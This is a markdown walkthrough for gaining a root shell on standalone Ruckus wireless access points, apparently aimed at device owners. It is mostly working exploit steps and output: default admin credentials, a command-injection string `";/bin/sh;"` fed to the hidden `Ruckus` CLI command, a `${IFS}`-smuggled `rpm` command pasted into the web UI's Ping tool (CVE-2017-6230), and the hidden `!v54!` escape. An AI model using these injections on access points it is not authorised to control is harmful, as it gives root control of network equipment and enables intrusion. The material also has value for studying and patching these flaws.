# Obtaining a root shell on Standalone/Solo Ruckus APs

The Ruckus CLI includes a hidden `!v54!` command which exits to a root shell.  

* Very old AP firmware checks a configuration setting `cli_esc2shell_ok` to decide whether the `!v54!` command is available.  
* Newer AP firmware checks an encrypted serial# to decide whether the `!v54!` command is available.  
The encrypted serial# is saved to a file using the `Ruckus` command, then the `!v54!` command uses `sesame` to decrypt this file.

## Firmware >112.0

Sorry, I don't have a method to bypass the serial# check on newer Standalone/Solo AP firmwares.  

If your AP was released before mid-2019 then you can downgrade to an older Solo firmware.

## Firmware 9.8 - 112.0 (excl. 110.0.0.0.2005)

These AP firmware versions [don't sanitize the encrypted serial#](https://alephsecurity.com/vulns/aleph-2019014#proof-of-concept).  
So we can use the `Ruckus` command to inject a root shell.
> Note that the injection only needs to be performed once.

### SSH to the AP

```console
$ ssh 192.168.0.1 -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa -oCiphers=+aes256-cbc
```

Login. Default username is "super", password is "sp-admin".

### Command injection

```console
rkscli: Ruckus
```

Now type `";/bin/sh;"` and hit enter *(you won't be able to see what you're typing)*

```console
grrrr
```

> Instead of `grrrr`, any other random dog noise could  be printed to the screen. 

### Escape to shell

```console
rkscli: !v54!
What's your chow: 
```

Now hit enter

```console
BusyBox v1.15.2 (2015-07-21 22:07:19 PDT) built-in shell (ash)
Enter 'help' for a list of built-in commands.

#
```

You have a root shell.

## Firmware Pre-9.8

These AP firmware versions [don't sanitize the input to the Ping diagnostic tool](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6230).  
So we can use `Ping` to enable `cli_esc2shell_ok`.
> Note that the `Ping` enablement only needs to be performed once.

### Connect to the AP's Web UI

Login. Default username is "super", password is "sp-admin".

### Enable shell escape

Go to `Administration` > `Diagnostics`, paste `|rpm${IFS}-p${IFS}cli_esc2shell_ok="t"` into the `Ping:` textbox & hit `Run test`.

### SSH to the AP

```console
$ ssh 192.168.0.1 -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa -oCiphers=+aes256-cbc
```

Login. Default username is "super", password is "sp-admin".

### Escape to shell

```console
rkscli: !v54!
What's your chow: 
```

Now hit enter

```console
BusyBox v1.15.2 (2015-07-21 22:07:19 PDT) built-in shell (ash)
Enter 'help' for a list of built-in commands.

#
```

You have a root shell.
